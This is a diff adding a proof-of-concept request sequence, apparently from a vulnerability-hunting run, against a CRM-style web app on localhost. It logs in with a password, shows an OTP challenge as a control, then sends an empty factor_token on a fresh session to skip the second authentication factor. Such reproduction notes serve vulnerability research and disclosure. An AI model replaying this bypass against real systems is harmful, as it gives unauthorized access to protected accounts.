@@ -1,0 +1,18 @@
+### Step A -- first-factor login (both sessions do this identically)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Referer: http://localhost:33116/index.php?module=Users&action=Login
+Content-Type: application/x-www-form-urlencoded
+
+module=Users&action=Authenticate&user_name=mod_d686329a&username_password=<redacted>
+
+### Step B (negative control) -- no factor_token at all -> OTP challenge shown, real OTP emailed
+GET /index.php?module=Home&action=index HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<session-1>
+
+### Step C (attack) -- FRESH session/login, first touch carries an EMPTY factor_token
+GET /index.php?module=Home&action=index&factor_token= HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<session-2>
